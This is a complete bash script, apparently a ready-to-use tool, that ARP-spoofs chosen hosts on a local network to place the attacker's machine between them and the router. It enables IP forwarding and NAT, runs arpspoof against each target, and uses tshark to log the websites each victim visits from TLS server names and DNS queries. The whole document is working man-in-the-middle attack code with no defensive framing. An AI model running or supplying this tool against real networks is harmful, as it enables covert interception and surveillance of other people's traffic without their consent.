#!/bin/bash

# Automatically detect active network interface
INTERFACE=$(ip route | grep default | awk '{print $5}')
if [ -z "$INTERFACE" ]; then
    echo "[!] Error: Could not detect network interface."
    exit 1
fi

# Get Router IP Automatically
ROUTER_IP=$(ip route | grep default | awk '{print $3}')
if [ -z "$ROUTER_IP" ]; then
    echo "[!] Error: Could not detect router IP."
    exit 1
fi

LOG_FILE="busted_multi_target.log"

# Ask user for target IPs
echo "[*] Detected router IP: $ROUTER_IP"
echo "[*] Enter target IPs separated by spaces (e.g., 192.168.0.6 192.168.0.10 192.168.0.15):"
read -r TARGET_IPS

# Convert input into an array
TARGET_IP_ARRAY=($TARGET_IPS)

# Check if at least one target was entered
if [ ${#TARGET_IP_ARRAY[@]} -eq 0 ]; then
    echo "[!] No targets provided. Exiting."
    exit 1
fi

cleanup() {
    echo -e "\n[*] Restoring network settings..."
    sudo pkill arpspoof
    sudo iptables --flush
    sudo iptables --table nat --flush
    sudo iptables --delete-chain
    sudo iptables --table nat --delete-chain
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
    echo "[*] Cleanup complete. Exiting."
    exit 0
}

# Trap CTRL+C to restore settings before exiting
trap cleanup SIGINT

echo "[*] Using detected network interface: $INTERFACE"
echo "[*] Enabling IP forwarding..."
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

echo "[*] Setting up NAT with iptables..."
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT

echo "[*] Running ARP spoofing for selected targets..."
for TARGET_IP in "${TARGET_IP_ARRAY[@]}"; do
    sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$ROUTER_IP" > /dev/null 2>&1 &
done

sleep 3  # Allow time for ARP spoofing to take effect

echo "[*] Capturing visited websites (Origin IP → Website, filtering for targets)..."
sudo tshark -i "$INTERFACE" -Y "tls.handshake.extensions_server_name or dns.qry.name" -T fields -e ip.src -e tls.handshake.extensions_server_name -e dns.qry.name | awk -v targets="${TARGET_IP_ARRAY[*]}" '
BEGIN {
    split(targets, target_list, " ");
}
{
    for (i in target_list) {
        if ($1 == target_list[i] && $2) {
            print $1, "→", $2;
            fflush(stdout);
        }
    }
}' | tee -a "$LOG_FILE"

# Cleanup is called when the user presses CTRL+C
